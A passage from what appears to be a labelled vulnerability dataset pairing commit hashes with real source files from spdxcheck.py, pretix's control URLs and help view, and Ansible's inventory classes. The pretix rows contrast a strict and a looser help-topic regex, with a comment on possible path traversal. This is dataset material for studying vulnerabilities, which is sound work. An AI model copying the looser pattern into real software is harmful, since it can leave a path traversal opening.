        if se.el:
            sys.stderr.write('%s: %s\n' %(se.el.path, se.txt))
        else:
            sys.stderr.write('%s\n' %se.txt)
        sys.exit(1)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)

    try:
        if len(args.path) and args.path[0] == '-':
            stdin = os.fdopen(sys.stdin.fileno(), 'rb')
            parser.parse_lines(stdin, args.maxlines, '-')
        else:
            if args.path:
                for p in args.path:
                    if os.path.isfile(p):
                        parser.parse_lines(open(p, 'rb'), args.maxlines, p)
                    elif os.path.isdir(p):
                        scan_git_subtree(repo.head.reference.commit.tree, p)
                    else:
                        sys.stderr.write('path %s does not exist\n' %p)
                        sys.exit(1)
            else:
                # Full git tree scan
                scan_git_tree(repo.head.commit.tree)

            if args.verbose:
                sys.stderr.write('\n')
                sys.stderr.write('License files:     %12d\n' %spdx.license_files)
                sys.stderr.write('Exception files:   %12d\n' %spdx.exception_files)
                sys.stderr.write('License IDs        %12d\n' %len(spdx.licenses))
                sys.stderr.write('Exception IDs      %12d\n' %len(spdx.exceptions))
                sys.stderr.write('\n')
                sys.stderr.write('Files checked:     %12d\n' %parser.checked)
                sys.stderr.write('Lines checked:     %12d\n' %parser.lines_checked)
                sys.stderr.write('Files with SPDX:   %12d\n' %parser.spdx_valid)
                sys.stderr.write('Files with errors: %12d\n' %parser.spdx_errors)

            sys.exit(0)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)
/n/n/n",0
31,e6d319f68d4dcf355e89a7b21368c47c004a14c2,"/scripts/spdxcheck.py/n/n#!/usr/bin/env python
# SPDX-License-Identifier: GPL-2.0
# Copyright Thomas Gleixner <tglx@linutronix.de>

from argparse import ArgumentParser
from ply import lex, yacc
import locale
import traceback
import sys
import git
import re
import os

class ParserException(Exception):
    def __init__(self, tok, txt):
        self.tok = tok
        self.txt = txt

class SPDXException(Exception):
    def __init__(self, el, txt):
        self.el = el
        self.txt = txt

class SPDXdata(object):
    def __init__(self):
        self.license_files = 0
        self.exception_files = 0
        self.licenses = [ ]
        self.exceptions = { }

# Read the spdx data from the LICENSES directory
def read_spdxdata(repo):

    # The subdirectories of LICENSES in the kernel source
    license_dirs = [ ""preferred"", ""other"", ""exceptions"" ]
    lictree = repo.head.commit.tree['LICENSES']

    spdx = SPDXdata()

    for d in license_dirs:
        for el in lictree[d].traverse():
            if not os.path.isfile(el.path):
                continue

            exception = None
            for l in open(el.path).readlines():
                if l.startswith('Valid-License-Identifier:'):
                    lid = l.split(':')[1].strip().upper()
                    if lid in spdx.licenses:
                        raise SPDXException(el, 'Duplicate License Identifier: %s' %lid)
                    else:
                        spdx.licenses.append(lid)

                elif l.startswith('SPDX-Exception-Identifier:'):
                    exception = l.split(':')[1].strip().upper()
                    spdx.exceptions[exception] = []

                elif l.startswith('SPDX-Licenses:'):
                    for lic in l.split(':')[1].upper().strip().replace(' ', '').replace('\t', '').split(','):
                        if not lic in spdx.licenses:
                            raise SPDXException(None, 'Exception %s missing license %s' %(ex, lic))
                        spdx.exceptions[exception].append(lic)

                elif l.startswith(""License-Text:""):
                    if exception:
                        if not len(spdx.exceptions[exception]):
                            raise SPDXException(el, 'Exception %s is missing SPDX-Licenses' %excid)
                        spdx.exception_files += 1
                    else:
                        spdx.license_files += 1
                    break
    return spdx

class id_parser(object):

    reserved = [ 'AND', 'OR', 'WITH' ]
    tokens = [ 'LPAR', 'RPAR', 'ID', 'EXC' ] + reserved

    precedence = ( ('nonassoc', 'AND', 'OR'), )

    t_ignore = ' \t'

    def __init__(self, spdx):
        self.spdx = spdx
        self.lasttok = None
        self.lastid = None
        self.lexer = lex.lex(module = self, reflags = re.UNICODE)
        # Initialize the parser. No debug file and no parser rules stored on disk
        # The rules are small enough to be generated on the fly
        self.parser = yacc.yacc(module = self, write_tables = False, debug = False)
        self.lines_checked = 0
        self.checked = 0
        self.spdx_valid = 0
        self.spdx_errors = 0
        self.curline = 0
        self.deepest = 0

    # Validate License and Exception IDs
    def validate(self, tok):
        id = tok.value.upper()
        if tok.type == 'ID':
            if not id in self.spdx.licenses:
                raise ParserException(tok, 'Invalid License ID')
            self.lastid = id
        elif tok.type == 'EXC':
            if id not in self.spdx.exceptions:
                raise ParserException(tok, 'Invalid Exception ID')
            if self.lastid not in self.spdx.exceptions[id]:
                raise ParserException(tok, 'Exception not valid for license %s' %self.lastid)
            self.lastid = None
        elif tok.type != 'WITH':
            self.lastid = None

    # Lexer functions
    def t_RPAR(self, tok):
        r'\)'
        self.lasttok = tok.type
        return tok

    def t_LPAR(self, tok):
        r'\('
        self.lasttok = tok.type
        return tok

    def t_ID(self, tok):
        r'[A-Za-z.0-9\-+]+'

        if self.lasttok == 'EXC':
            print(tok)
            raise ParserException(tok, 'Missing parentheses')

        tok.value = tok.value.strip()
        val = tok.value.upper()

        if val in self.reserved:
            tok.type = val
        elif self.lasttok == 'WITH':
            tok.type = 'EXC'

        self.lasttok = tok.type
        self.validate(tok)
        return tok

    def t_error(self, tok):
        raise ParserException(tok, 'Invalid token')

    def p_expr(self, p):
        '''expr : ID
                | ID WITH EXC
                | expr AND expr
                | expr OR expr
                | LPAR expr RPAR'''
        pass

    def p_error(self, p):
        if not p:
            raise ParserException(None, 'Unfinished license expression')
        else:
            raise ParserException(p, 'Syntax error')

    def parse(self, expr):
        self.lasttok = None
        self.lastid = None
        self.parser.parse(expr, lexer = self.lexer)

    def parse_lines(self, fd, maxlines, fname):
        self.checked += 1
        self.curline = 0
        try:
            for line in fd:
                line = line.decode(locale.getpreferredencoding(False), errors='ignore')
                self.curline += 1
                if self.curline > maxlines:
                    break
                self.lines_checked += 1
                if line.find(""SPDX-License-Identifier:"") < 0:
                    continue
                expr = line.split(':')[1].strip()
                # Remove trailing comment closure
                if line.strip().endswith('*/'):
                    expr = expr.rstrip('*/').strip()
                # Special case for SH magic boot code files
                if line.startswith('LIST \""'):
                    expr = expr.rstrip('\""').strip()
                self.parse(expr)
                self.spdx_valid += 1
                #
                # Should we check for more SPDX ids in the same file and
                # complain if there are any?
                #
                break

        except ParserException as pe:
            if pe.tok:
                col = line.find(expr) + pe.tok.lexpos
                tok = pe.tok.value
                sys.stdout.write('%s: %d:%d %s: %s\n' %(fname, self.curline, col, pe.txt, tok))
            else:
                sys.stdout.write('%s: %d:0 %s\n' %(fname, self.curline, col, pe.txt))
            self.spdx_errors += 1

def scan_git_tree(tree):
    for el in tree.traverse():
        # Exclude stuff which would make pointless noise
        # FIXME: Put this somewhere more sensible
        if el.path.startswith(""LICENSES""):
            continue
        if el.path.find(""license-rules.rst"") >= 0:
            continue
        if not os.path.isfile(el.path):
            continue
        with open(el.path, 'rb') as fd:
            parser.parse_lines(fd, args.maxlines, el.path)

def scan_git_subtree(tree, path):
    for p in path.strip('/').split('/'):
        tree = tree[p]
    scan_git_tree(tree)

if __name__ == '__main__':

    ap = ArgumentParser(description='SPDX expression checker')
    ap.add_argument('path', nargs='*', help='Check path or file. If not given full git tree scan. For stdin use ""-""')
    ap.add_argument('-m', '--maxlines', type=int, default=15,
                    help='Maximum number of lines to scan in a file. Default 15')
    ap.add_argument('-v', '--verbose', action='store_true', help='Verbose statistics output')
    args = ap.parse_args()

    # Sanity check path arguments
    if '-' in args.path and len(args.path) > 1:
        sys.stderr.write('stdin input ""-"" must be the only path argument\n')
        sys.exit(1)

    try:
        # Use git to get the valid license expressions
        repo = git.Repo(os.getcwd())
        assert not repo.bare

        # Initialize SPDX data
        spdx = read_spdxdata(repo)

        # Initilize the parser
        parser = id_parser(spdx)

    except SPDXException as se:
        if se.el:
            sys.stderr.write('%s: %s\n' %(se.el.path, se.txt))
        else:
            sys.stderr.write('%s\n' %se.txt)
        sys.exit(1)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)

    try:
        if len(args.path) and args.path[0] == '-':
            stdin = os.fdopen(sys.stdin.fileno(), 'rb')
            parser.parse_lines(stdin, args.maxlines, '-')
        else:
            if args.path:
                for p in args.path:
                    if os.path.isfile(p):
                        parser.parse_lines(open(p, 'rb'), args.maxlines, p)
                    elif os.path.isdir(p):
                        scan_git_subtree(repo.head.reference.commit.tree, p)
                    else:
                        sys.stderr.write('path %s does not exist\n' %p)
                        sys.exit(1)
            else:
                # Full git tree scan
                scan_git_tree(repo.head.commit.tree)

            if args.verbose:
                sys.stderr.write('\n')
                sys.stderr.write('License files:     %12d\n' %spdx.license_files)
                sys.stderr.write('Exception files:   %12d\n' %spdx.exception_files)
                sys.stderr.write('License IDs        %12d\n' %len(spdx.licenses))
                sys.stderr.write('Exception IDs      %12d\n' %len(spdx.exceptions))
                sys.stderr.write('\n')
                sys.stderr.write('Files checked:     %12d\n' %parser.checked)
                sys.stderr.write('Lines checked:     %12d\n' %parser.lines_checked)
                sys.stderr.write('Files with SPDX:   %12d\n' %parser.spdx_valid)
                sys.stderr.write('Files with errors: %12d\n' %parser.spdx_errors)

            sys.exit(0)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)
/n/n/n",1
32,aad44105a4e93683b4aa171ff342cd3cf17dd159,"src/pretix/control/urls.py/n/nfrom django.conf.urls import include, url

from pretix.control.views import (
    attendees, auth, dashboards, event, help, item, main, orders, organizer,
    user, vouchers,
)

urlpatterns = [
    url(r'^logout$', auth.logout, name='auth.logout'),
    url(r'^login$', auth.login, name='auth.login'),
    url(r'^register$', auth.register, name='auth.register'),
    url(r'^forgot$', auth.Forgot.as_view(), name='auth.forgot'),
    url(r'^forgot/recover$', auth.Recover.as_view(), name='auth.forgot.recover'),
    url(r'^$', dashboards.user_index, name='index'),
    url(r'^settings$', user.UserSettings.as_view(), name='user.settings'),
    url(r'^organizers/$', organizer.OrganizerList.as_view(), name='organizers'),
    url(r'^organizers/add$', organizer.OrganizerCreate.as_view(), name='organizers.add'),
    url(r'^organizer/(?P<organizer>[^/]+)/edit$', organizer.OrganizerUpdate.as_view(), name='organizer.edit'),
    url(r'^events/$', main.EventList.as_view(), name='events'),
    url(r'^events/add$', main.EventCreateStart.as_view(), name='events.add'),
    url(r'^event/(?P<organizer>[^/]+)/add', main.EventCreate.as_view(), name='events.create'),
    url(r'^event/(?P<organizer>[^/]+)/(?P<event>[^/]+)/', include([
        url(r'^$', dashboards.event_index, name='event.index'),
        url(r'^live/$', event.EventLive.as_view(), name='event.live'),
        url(r'^settings/$', event.EventUpdate.as_view(), name='event.settings'),
        url(r'^settings/plugins$', event.EventPlugins.as_view(), name='event.settings.plugins'),
        url(r'^settings/permissions$', event.EventPermissions.as_view(), name='event.settings.permissions'),
        url(r'^settings/payment$', event.PaymentSettings.as_view(), name='event.settings.payment'),
        url(r'^settings/tickets$', event.TicketSettings.as_view(), name='event.settings.tickets'),
        url(r'^settings/email$', event.MailSettings.as_view(), name='event.settings.mail'),
        url(r'^settings/invoice$', event.InvoiceSettings.as_view(), name='event.settings.invoice'),
        url(r'^settings/display', event.DisplaySettings.as_view(), name='event.settings.display'),
        url(r'^items/$', item.ItemList.as_view(), name='event.items'),
        url(r'^items/add$', item.ItemCreate.as_view(), name='event.items.add'),
        url(r'^items/(?P<item>\d+)/$', item.ItemUpdateGeneral.as_view(), name='event.item'),
        url(r'^items/(?P<item>\d+)/variations$', item.ItemVariations.as_view(),
            name='event.item.variations'),
        url(r'^items/(?P<item>\d+)/up$', item.item_move_up, name='event.items.up'),
        url(r'^items/(?P<item>\d+)/down$', item.item_move_down, name='event.items.down'),
        url(r'^items/(?P<item>\d+)/delete$', item.ItemDelete.as_view(), name='event.items.delete'),
        url(r'^categories/$', item.CategoryList.as_view(), name='event.items.categories'),
        url(r'^categories/(?P<category>\d+)/delete$', item.CategoryDelete.as_view(),
            name='event.items.categories.delete'),
        url(r'^categories/(?P<category>\d+)/up$', item.category_move_up, name='event.items.categories.up'),
        url(r'^categories/(?P<category>\d+)/down$', item.category_move_down,
            name='event.items.categories.down'),
        url(r'^categories/(?P<category>\d+)/$', item.CategoryUpdate.as_view(),
            name='event.items.categories.edit'),
        url(r'^categories/add$', item.CategoryCreate.as_view(), name='event.items.categories.add'),
        url(r'^questions/$', item.QuestionList.as_view(), name='event.items.questions'),
        url(r'^questions/(?P<question>\d+)/delete$', item.QuestionDelete.as_view(),
            name='event.items.questions.delete'),
        url(r'^questions/(?P<question>\d+)/up$', item.question_move_up, name='event.items.questions.up'),
        url(r'^questions/(?P<question>\d+)/down$', item.question_move_down,
            name='event.items.questions.down'),
        url(r'^questions/(?P<question>\d+)/$', item.QuestionUpdate.as_view(),
            name='event.items.questions.edit'),
        url(r'^questions/add$', item.QuestionCreate.as_view(), name='event.items.questions.add'),
        url(r'^quotas/$', item.QuotaList.as_view(), name='event.items.quotas'),
        url(r'^quotas/(?P<quota>\d+)/$', item.QuotaUpdate.as_view(), name='event.items.quotas.edit'),
        url(r'^quotas/(?P<quota>\d+)/delete$', item.QuotaDelete.as_view(),
            name='event.items.quotas.delete'),
        url(r'^quotas/add$', item.QuotaCreate.as_view(), name='event.items.quotas.add'),
        url(r'^vouchers/$', vouchers.VoucherList.as_view(), name='event.vouchers'),
        url(r'^vouchers/tags/$', vouchers.VoucherTags.as_view(), name='event.vouchers.tags'),
        url(r'^vouchers/(?P<voucher>\d+)/$', vouchers.VoucherUpdate.as_view(), name='event.voucher'),
        url(r'^vouchers/(?P<voucher>\d+)/delete$', vouchers.VoucherDelete.as_view(),
            name='event.voucher.delete'),
        url(r'^vouchers/add$', vouchers.VoucherCreate.as_view(), name='event.vouchers.add'),
        url(r'^vouchers/bulk_add$', vouchers.VoucherBulkCreate.as_view(), name='event.vouchers.bulk'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/transition$', orders.OrderTransition.as_view(),
            name='event.order.transition'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/resend$', orders.OrderResendLink.as_view(),
            name='event.order.resendlink'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/invoice$', orders.OrderInvoiceCreate.as_view(),
            name='event.order.geninvoice'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/invoices/(?P<id>\d+)/regenerate$', orders.OrderInvoiceRegenerate.as_view(),
            name='event.order.regeninvoice'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/invoices/(?P<id>\d+)/reissue$', orders.OrderInvoiceReissue.as_view(),
            name='event.order.reissueinvoice'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/extend$', orders.OrderExtend.as_view(),
            name='event.order.extend'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/comment$', orders.OrderComment.as_view(),
            name='event.order.comment'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/$', orders.OrderDetail.as_view(), name='event.order'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/download/(?P<output>[^/]+)$', orders.OrderDownload.as_view(),
            name='event.order.download'),
        url(r'^invoice/(?P<invoice>[^/]+)$', orders.InvoiceDownload.as_view(),
            name='event.invoice.download'),
        url(r'^orders/overview/$', orders.OverView.as_view(), name='event.orders.overview'),
        url(r'^orders/export/$', orders.ExportView.as_view(), name='event.orders.export'),
        url(r'^orders/go$', orders.OrderGo.as_view(), name='event.orders.go'),
        url(r'^orders/$', orders.OrderList.as_view(), name='event.orders'),
        url(r'^attendees/$', attendees.AttendeeList.as_view(), name='event.attendees'),
    ])),
    url(r'^help/(?P<topic>[a-zA-Z0-9_/]+)$', help.HelpView.as_view(), name='help'),
]
/n/n/nsrc/pretix/control/views/help.py/n/nfrom django import template
from django.http import Http404
from django.shortcuts import render
from django.views.generic import View

from pretix.base.models import Organizer


class HelpView(View):
    model = Organizer
    context_object_name = 'organizers'
    template_name = 'pretixcontrol/organizers/index.html'
    paginate_by = 30

    def get(self, request, *args, **kwargs):
        # In a security review, this came up as a possible path traversal issue. However, the URL regex
        # does not allow any dots in the argument (which forbids traversing upwards in the directory tree).
        # Even if it *was* possbile, it'd be loaded through django's template loader and therefore limited
        # to TEMPLATE_DIR.
        try:
            locale = request.LANGUAGE_CODE
            return render(request, 'pretixcontrol/help/%s.%s.html' % (kwargs.get('topic'), locale), {})
        except template.TemplateDoesNotExist:
            try:
                return render(request, 'pretixcontrol/help/%s.html' % kwargs.get('topic'), {})
            except template.TemplateDoesNotExist:
                raise Http404('')
/n/n/n",0
33,aad44105a4e93683b4aa171ff342cd3cf17dd159,"/src/pretix/control/urls.py/n/nfrom django.conf.urls import include, url

from pretix.control.views import (
    attendees, auth, dashboards, event, help, item, main, orders, organizer,
    user, vouchers,
)

urlpatterns = [
    url(r'^logout$', auth.logout, name='auth.logout'),
    url(r'^login$', auth.login, name='auth.login'),
    url(r'^register$', auth.register, name='auth.register'),
    url(r'^forgot$', auth.Forgot.as_view(), name='auth.forgot'),
    url(r'^forgot/recover$', auth.Recover.as_view(), name='auth.forgot.recover'),
    url(r'^$', dashboards.user_index, name='index'),
    url(r'^settings$', user.UserSettings.as_view(), name='user.settings'),
    url(r'^organizers/$', organizer.OrganizerList.as_view(), name='organizers'),
    url(r'^organizers/add$', organizer.OrganizerCreate.as_view(), name='organizers.add'),
    url(r'^organizer/(?P<organizer>[^/]+)/edit$', organizer.OrganizerUpdate.as_view(), name='organizer.edit'),
    url(r'^events/$', main.EventList.as_view(), name='events'),
    url(r'^events/add$', main.EventCreateStart.as_view(), name='events.add'),
    url(r'^event/(?P<organizer>[^/]+)/add', main.EventCreate.as_view(), name='events.create'),
    url(r'^event/(?P<organizer>[^/]+)/(?P<event>[^/]+)/', include([
        url(r'^$', dashboards.event_index, name='event.index'),
        url(r'^live/$', event.EventLive.as_view(), name='event.live'),
        url(r'^settings/$', event.EventUpdate.as_view(), name='event.settings'),
        url(r'^settings/plugins$', event.EventPlugins.as_view(), name='event.settings.plugins'),
        url(r'^settings/permissions$', event.EventPermissions.as_view(), name='event.settings.permissions'),
        url(r'^settings/payment$', event.PaymentSettings.as_view(), name='event.settings.payment'),
        url(r'^settings/tickets$', event.TicketSettings.as_view(), name='event.settings.tickets'),
        url(r'^settings/email$', event.MailSettings.as_view(), name='event.settings.mail'),
        url(r'^settings/invoice$', event.InvoiceSettings.as_view(), name='event.settings.invoice'),
        url(r'^settings/display', event.DisplaySettings.as_view(), name='event.settings.display'),
        url(r'^items/$', item.ItemList.as_view(), name='event.items'),
        url(r'^items/add$', item.ItemCreate.as_view(), name='event.items.add'),
        url(r'^items/(?P<item>\d+)/$', item.ItemUpdateGeneral.as_view(), name='event.item'),
        url(r'^items/(?P<item>\d+)/variations$', item.ItemVariations.as_view(),
            name='event.item.variations'),
        url(r'^items/(?P<item>\d+)/up$', item.item_move_up, name='event.items.up'),
        url(r'^items/(?P<item>\d+)/down$', item.item_move_down, name='event.items.down'),
        url(r'^items/(?P<item>\d+)/delete$', item.ItemDelete.as_view(), name='event.items.delete'),
        url(r'^categories/$', item.CategoryList.as_view(), name='event.items.categories'),
        url(r'^categories/(?P<category>\d+)/delete$', item.CategoryDelete.as_view(),
            name='event.items.categories.delete'),
        url(r'^categories/(?P<category>\d+)/up$', item.category_move_up, name='event.items.categories.up'),
        url(r'^categories/(?P<category>\d+)/down$', item.category_move_down,
            name='event.items.categories.down'),
        url(r'^categories/(?P<category>\d+)/$', item.CategoryUpdate.as_view(),
            name='event.items.categories.edit'),
        url(r'^categories/add$', item.CategoryCreate.as_view(), name='event.items.categories.add'),
        url(r'^questions/$', item.QuestionList.as_view(), name='event.items.questions'),
        url(r'^questions/(?P<question>\d+)/delete$', item.QuestionDelete.as_view(),
            name='event.items.questions.delete'),
        url(r'^questions/(?P<question>\d+)/up$', item.question_move_up, name='event.items.questions.up'),
        url(r'^questions/(?P<question>\d+)/down$', item.question_move_down,
            name='event.items.questions.down'),
        url(r'^questions/(?P<question>\d+)/$', item.QuestionUpdate.as_view(),
            name='event.items.questions.edit'),
        url(r'^questions/add$', item.QuestionCreate.as_view(), name='event.items.questions.add'),
        url(r'^quotas/$', item.QuotaList.as_view(), name='event.items.quotas'),
        url(r'^quotas/(?P<quota>\d+)/$', item.QuotaUpdate.as_view(), name='event.items.quotas.edit'),
        url(r'^quotas/(?P<quota>\d+)/delete$', item.QuotaDelete.as_view(),
            name='event.items.quotas.delete'),
        url(r'^quotas/add$', item.QuotaCreate.as_view(), name='event.items.quotas.add'),
        url(r'^vouchers/$', vouchers.VoucherList.as_view(), name='event.vouchers'),
        url(r'^vouchers/tags/$', vouchers.VoucherTags.as_view(), name='event.vouchers.tags'),
        url(r'^vouchers/(?P<voucher>\d+)/$', vouchers.VoucherUpdate.as_view(), name='event.voucher'),
        url(r'^vouchers/(?P<voucher>\d+)/delete$', vouchers.VoucherDelete.as_view(),
            name='event.voucher.delete'),
        url(r'^vouchers/add$', vouchers.VoucherCreate.as_view(), name='event.vouchers.add'),
        url(r'^vouchers/bulk_add$', vouchers.VoucherBulkCreate.as_view(), name='event.vouchers.bulk'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/transition$', orders.OrderTransition.as_view(),
            name='event.order.transition'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/resend$', orders.OrderResendLink.as_view(),
            name='event.order.resendlink'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/invoice$', orders.OrderInvoiceCreate.as_view(),
            name='event.order.geninvoice'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/invoices/(?P<id>\d+)/regenerate$', orders.OrderInvoiceRegenerate.as_view(),
            name='event.order.regeninvoice'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/invoices/(?P<id>\d+)/reissue$', orders.OrderInvoiceReissue.as_view(),
            name='event.order.reissueinvoice'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/extend$', orders.OrderExtend.as_view(),
            name='event.order.extend'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/comment$', orders.OrderComment.as_view(),
            name='event.order.comment'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/$', orders.OrderDetail.as_view(), name='event.order'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/download/(?P<output>[^/]+)$', orders.OrderDownload.as_view(),
            name='event.order.download'),
        url(r'^invoice/(?P<invoice>[^/]+)$', orders.InvoiceDownload.as_view(),
            name='event.invoice.download'),
        url(r'^orders/overview/$', orders.OverView.as_view(), name='event.orders.overview'),
        url(r'^orders/export/$', orders.ExportView.as_view(), name='event.orders.export'),
        url(r'^orders/go$', orders.OrderGo.as_view(), name='event.orders.go'),
        url(r'^orders/$', orders.OrderList.as_view(), name='event.orders'),
        url(r'^attendees/$', attendees.AttendeeList.as_view(), name='event.attendees'),
    ])),
    url(r'^help/(?P<topic>[^.]+)$', help.HelpView.as_view(), name='help'),
]
/n/n/n",1
34,153c9bd539eeffdd6d395b8840f95d56e3814f27,"lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError

from itertools import chain


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    def _walk_relationship(self, rel):
        '''
        Given `rel` that is an iterable property of Group,
        consitituting a directed acyclic graph among all groups,
        Returns a set of all groups in full tree
        A   B    C
        |  / |  /
        | /  | /
        D -> E
        |  /    vertical connections
        | /     are directed upward
        F
        Called on F, returns set of (A, B, C, D, E)
        '''
        seen = set([])
        unprocessed = set(getattr(self, rel))

        while unprocessed:
            seen.update(unprocessed)
            unprocessed = set(chain.from_iterable(
                getattr(g, rel) for g in unprocessed
            ))
            unprocessed.difference_update(seen)

        return seen

    def get_ancestors(self):
        return self._walk_relationship('parent_groups')

    def get_descendants(self):
        return self._walk_relationship('child_groups')

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception(""can't add group to itself"")

        # don't add if it's already there
        if group not in self.child_groups:

            # prepare list of group's new ancestors this edge creates
            start_ancestors = group.get_ancestors()
            new_ancestors = self.get_ancestors()
            if group in new_ancestors:
                raise AnsibleError(
                    ""Adding group '%s' as child to '%s' creates a recursive ""
                    ""dependency loop."" % (group.name, self.name))
            new_ancestors.add(self)
            new_ancestors.difference_update(start_ancestors)

            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])

            # update the depth of the grandchildren
            group._check_children_depth()

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors(additions=new_ancestors)

            self.clear_hosts_cache()

    def _check_children_depth(self):

        depth = self.depth
        start_depth = self.depth  # self.depth could change over loop
        seen = set([])
        unprocessed = set(self.child_groups)

        while unprocessed:
            seen.update(unprocessed)
            depth += 1
            to_process = unprocessed.copy()
            unprocessed = set([])
            for g in to_process:
                if g.depth < depth:
                    g.depth = depth
                    unprocessed.update(g.child_groups)
            if depth - start_depth > len(seen):
                raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.get_ancestors():
            g._hosts_cache = None

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.get_descendants():
            kid_hosts = kid.hosts
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def set_priority(self, priority):
        try:
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass
/n/n/nlib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
